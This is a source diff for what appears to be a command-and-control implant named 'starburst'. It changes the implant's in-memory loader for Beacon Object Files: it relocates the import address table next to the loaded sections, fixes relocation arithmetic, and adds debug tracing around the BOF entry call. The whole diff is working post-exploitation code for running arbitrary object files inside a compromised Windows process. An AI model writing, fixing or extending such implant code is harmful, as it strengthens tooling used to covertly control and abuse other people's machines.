@@ -294,6 +294,10 @@ static auto declfn resolve_coff_symbol(
         case _fnv1a("BeaconCleanupProcess"):   return (void*)beacon_cleanup_thread;
     }
 
+    if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
+        return resolve_coff_symbol( inst, name + 6 );
+    }
+
     char mod_name[64] = { 0 };
     char func_name[128] = { 0 };
 
@@ -318,10 +322,6 @@ static auto declfn resolve_coff_symbol(
             auto addr = inst.kernel32.GetProcAddress( h_mod, func_name );
             if ( addr ) return (void*)addr;
         }
-    }
-
-    if ( name[0] == '_' && name[1] == '_' && name[2] == 'i' && name[3] == 'm' && name[4] == 'p' && name[5] == '_' ) {
-        return resolve_coff_symbol( inst, name + 6 );
     }
 
     DBG_PRINT( inst, "COFF: unresolved symbol: %s\n", name );
@@ -372,8 +372,9 @@ auto declfn starburst::cmd_execute_coff(
         return;
     }
 
-    // calculate total size: all sections (16-byte aligned) + trampoline space
+    // calculate total size: sections (16-byte aligned) + trampolines + IAT
     // trampolines: 12 bytes each (mov rax,imm64 + jmp rax), one per symbol max
+    // IAT must be co-located so REL32 relocations from BOF code can reach it
     uint32_t total_alloc = 0;
     uint32_t sec_offsets[256] = { 0 };
     uint32_t sec_sizes[256] = { 0 };
@@ -386,6 +387,8 @@ auto declfn starburst::cmd_execute_coff(
     }
     uint32_t tramp_offset = total_alloc;
     total_alloc += header->NumberOfSymbols * 12;
+    uint32_t imp_offset = ( total_alloc + 7 ) & ~7u;
+    total_alloc = imp_offset + header->NumberOfSymbols * sizeof(void*);
 
     auto coff_base = static_cast<uint8_t*>(
         inst.kernel32.VirtualAlloc(
@@ -410,6 +413,8 @@ auto declfn starburst::cmd_execute_coff(
     auto tramp_ptr = coff_base + tramp_offset;
     uint32_t tramp_used = 0;
 
+    auto imp_table = reinterpret_cast<void**>( coff_base + imp_offset );
+
     auto func_ptrs = static_cast<void**>(
         inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
     if ( !func_ptrs ) {
@@ -419,18 +424,7 @@ auto declfn starburst::cmd_execute_coff(
             symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
         return;
     }
-
-    // IAT for __imp_ symbols: code does indirect calls through these pointers
-    auto imp_table = static_cast<void**>(
-        inst.heap_alloc( header->NumberOfSymbols * sizeof(void*) ) );
-    if ( !imp_table ) {
-        inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
-        inst.heap_free( section_ptrs );
-        inst.heap_free( func_ptrs );
-        queue_response( inst, task_uuid, RESPONSE_ERROR,
-            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
-        return;
-    }
+    memory::zero( func_ptrs, header->NumberOfSymbols * sizeof(void*) );
 
     void* entry_ptr = nullptr;
 
@@ -451,12 +445,15 @@ auto declfn starburst::cmd_execute_coff(
             if ( str_cmp( sym_name, entry_buf ) == 0 ||
                  ( sym_name[0] == '_' && str_cmp( sym_name + 1, entry_buf ) == 0 ) ) {
                 entry_ptr = func_ptrs[i];
+                DBG_PRINT( inst, "COFF: entry '%s' at %p\n", sym_name, entry_ptr );
             }
         } else if ( symbols[i].SectionNumber == 0 && symbols[i].StorageClass == 2 ) {
             bool is_imp = sym_name[0] == '_' && sym_name[1] == '_' &&
                           sym_name[2] == 'i' && sym_name[3] == 'm' &&
                           sym_name[4] == 'p' && sym_name[5] == '_';
             void* resolved = resolve_coff_symbol( inst, sym_name );
+            DBG_PRINT( inst, "COFF: sym[%u] '%s' imp=%d resolved=%p\n",
+                i, sym_name, is_imp ? 1 : 0, resolved );
             if ( is_imp && resolved ) {
                 imp_table[i] = resolved;
                 func_ptrs[i] = &imp_table[i];
@@ -484,7 +481,6 @@ auto declfn starburst::cmd_execute_coff(
         inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
         inst.heap_free( section_ptrs );
         inst.heap_free( func_ptrs );
-        inst.heap_free( imp_table );
         queue_response( inst, task_uuid, RESPONSE_ERROR,
             symbol<char*>( const_cast<char*>( "entry point not found" ) ) );
         return;
@@ -506,11 +502,11 @@ auto declfn starburst::cmd_execute_coff(
 
             switch ( relocs[r].Type ) {
                 case IMAGE_REL_AMD64_ADDR64:
-                    *reinterpret_cast<uint64_t*>( target ) = sym_addr;
+                    *reinterpret_cast<uint64_t*>( target ) += sym_addr;
                     break;
                 case IMAGE_REL_AMD64_ADDR32NB:
-                    *reinterpret_cast<uint32_t*>( target ) = static_cast<uint32_t>(
-                        sym_addr - reinterpret_cast<uintptr_t>( target ) - 4 );
+                    *reinterpret_cast<uint32_t*>( target ) += static_cast<uint32_t>(
+                        sym_addr - reinterpret_cast<uintptr_t>( coff_base ) );
                     break;
                 case IMAGE_REL_AMD64_REL32:
                     *reinterpret_cast<int32_t*>( target ) +=
@@ -564,10 +560,14 @@ auto declfn starburst::cmd_execute_coff(
     instance* old_aup = coff_get_inst();
     coff_set_inst( &inst );
 
-    // execute entry point: void go(char* args, int len)
+    DBG_PRINT( inst, "COFF: calling entry at %p, args=%p len=%u\n",
+        entry_ptr, args_data, args_len );
+
     typedef void ( __cdecl *bof_entry )( char*, int );
     auto go_fn = reinterpret_cast<bof_entry>( entry_ptr );
     go_fn( reinterpret_cast<char*>( args_data ), args_len );
+
+    DBG_PRINT( inst, "COFF: entry returned\n" );
 
     // restore ArbitraryUserPointer
     coff_set_inst( old_aup );
@@ -587,7 +587,6 @@ auto declfn starburst::cmd_execute_coff(
     inst.kernel32.VirtualFree( coff_base, 0, MEM_RELEASE );
     inst.heap_free( section_ptrs );
     inst.heap_free( func_ptrs );
-    inst.heap_free( imp_table );
 }
 
 #endif
